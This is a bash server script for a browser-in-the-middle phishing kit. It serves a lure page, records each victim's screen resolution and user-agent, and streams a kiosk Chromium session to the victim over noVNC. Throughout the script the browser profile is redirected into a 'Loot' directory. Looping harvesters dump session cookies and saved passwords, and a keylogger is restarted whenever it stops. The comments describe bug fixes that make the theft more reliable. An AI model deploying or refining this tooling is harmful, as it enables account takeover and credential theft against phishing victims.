#!/bin/bash
# server.sh

export DISPLAY=:0
export URL="$WEBPAGE"

# ── Landing page: capture victim resolution + user-agent ─────────────────────
# PHP serves index.php on port 8111; once the victim clicks the CTA button,
# their screen resolution is POSTed here and written to the tmp file.
php -q -S 0.0.0.0:8111 &

# make target URL available to PHP for page-title fetching
echo "URL=$WEBPAGE" > php.ini

# block until victim submits their resolution
while [ ! -f /home/user/tmp/resolution$SID.txt ]; do
    sleep .2
done

# swap PHP out; connect port 8111 straight through to noVNC WebSocket
sudo pkill -9 php
sudo socat TCP-LISTEN:8111,reuseaddr,fork TCP:localhost:5980 &

export RESOLUTION=$(head -1 /home/user/tmp/resolution$SID.txt)
export REQID=$(head -1 /home/user/tmp/reqid$SID.txt)
export USERA=$(head -1 /home/user/tmp/useragent$SID.txt)

# remove any stale X display lock
sudo rm -f /tmp/.X${DISPLAY#:}-lock

# inject victim resolution + profile dir into Chromium launch flags
IFS=x read -ra arr <<< "$RESOLUTION" && \
  sudo sed -i \
    "s#--window-size=[0-9]*,[0-9]*#--window-size=${arr[0]},${arr[1]} --user-data-dir=/home/user/Chrome#" \
    /etc/chromium/chromium.conf

# ─────────────────────────────────────────────────────────────────────────────
# BUG FIX #1 — Loot dir setup MUST happen BEFORE Chromium is launched.
#
# Original order was: start kiosk.sh (Chromium) → then rm + ln for loot dirs.
# If Chromium opened /home/user/Chrome/ before the rm -rf ran, that rm deleted
# the Chrome profile dir from under a running process.  Chromium's file
# descriptors became dangling — pointing to unlinked inodes.  Every subsequent
# cookie / password / history write went to those unlinked inodes and was lost.
# The symlink created afterward pointed to an EMPTY /etc/Loot/.../Chrome/ dir.
#
# Fix: create the symlinks first.  Chromium then opens the profile directly
# inside the Loot-backed directory, so all writes land there immediately.
# ─────────────────────────────────────────────────────────────────────────────
date_tag=$(date +"%Y%m%d-%H%M%S")
ldir="${date_tag}-${REQID}"

mkdir -p /etc/Loot/${ldir}/{Downloads,Chrome}
rm   -rf /home/user/{Downloads,Chrome}
ln   -s  /etc/Loot/${ldir}/Downloads  /home/user/Downloads
ln   -s  /etc/Loot/${ldir}/Chrome     /home/user/Chrome

# Pre-create all loot files so HAProxy / phishboard can read them immediately
touch  /home/user/Downloads/{cookies.txt,cookies-netscape.txt,passwords.txt,keylog.txt}
chmod a+w /home/user/Downloads/{cookies.txt,cookies-netscape.txt,passwords.txt,keylog.txt}

# errorlog goes into the Loot Downloads dir (visible on host, not hidden inside
# the container at /home/user/errorlog.txt as in the original)
export ERRLOG="/home/user/Downloads/errorlog.txt"
touch "$ERRLOG" && chmod a+w "$ERRLOG"
echo "[*] $(date -u): session start — SID=${SID} REQID=${REQID}" >> "$ERRLOG"

# ── NOW start kiosk.sh — Chromium opens its profile directly in the Loot dir ─
/bin/bash /home/user/kiosk.sh "$USERA" &

# ─────────────────────────────────────────────────────────────────────────────
# BUG FIX #2 — pycryptodome MUST be available before the harvester loop runs.
#
# Original: `nohup sudo pip3 install pycryptodome ... &` (async background).
# The cookie loop started 5 s later; if pip hadn't finished, cookies.py failed
# with ImportError, stdout was empty, and `> cookies.txt` truncated the file
# to 0 bytes every iteration.
#
# Fix: pycryptodome and pyxhook are now pre-installed in the Docker image
# (see Dockerfile: `RUN pip3 install pycryptodome pyxhook`).
# No runtime install needed here.
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# Cookie + Password harvester loop
#
# BUG FIX #3 — Guard: wait for Chromium to create Chrome/Default/ before
# attempting any SQLite reads.  Without this, sqlite3.connect() fails because
# the target path doesn't exist (can't create file in nonexistent directory),
# the script exits silently, and cookies.txt stays empty.
# ─────────────────────────────────────────────────────────────────────────────
(
    while [ ! -d /home/user/Chrome/Default ]; do sleep 1; done
    echo "[*] $(date -u): Chrome/Default detected — harvesters starting" >> "$ERRLOG"

    while true; do
        sleep 10
        # Overwrite each run: we want the CURRENT full cookie set, not appended history
        sudo python3 /home/user/cookies.py   >  /home/user/Downloads/cookies.txt   2>> "$ERRLOG"
        sudo python3 /home/user/passwords.py >  /home/user/Downloads/passwords.txt 2>> "$ERRLOG"
    done
) &

# ── Keylogger — restart if it crashes ────────────────────────────────────────
# BUG FIX #4 — original loop condition was broken (>/dev/null inside $() made
# the test always true).  Also used relative path for keylogger.py.
# New: absolute path, correct ps check, errorlog in Loot.
(
    while true; do
        if ! ps aux | grep -v grep | grep -q "keylogger.py"; then
            sudo python3 /home/user/keylogger.py 2>> "$ERRLOG"
        fi
        sleep 4
    done
) &

# ── Start X virtual framebuffer ───────────────────────────────────────────────
nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION \
    -ac +extension GLX +extension RANDR +render -noreset > /dev/null &

# wait until display is ready
while [[ ! $(xdpyinfo -display $DISPLAY 2>/dev/null) ]]; do sleep .3; done

# ── VNC server ────────────────────────────────────────────────────────────────
nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared \
    -display $DISPLAY -rfbauth /home/user/.vnc/passwd \
    -rfbport 5900 -xrandr resize "$@" &

# ── Display resize watcher ────────────────────────────────────────────────────
nohup /bin/bash /home/user/resize_watcher.sh &

# ── noVNC WebSocket proxy — foreground, keeps container alive ─────────────────
nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980
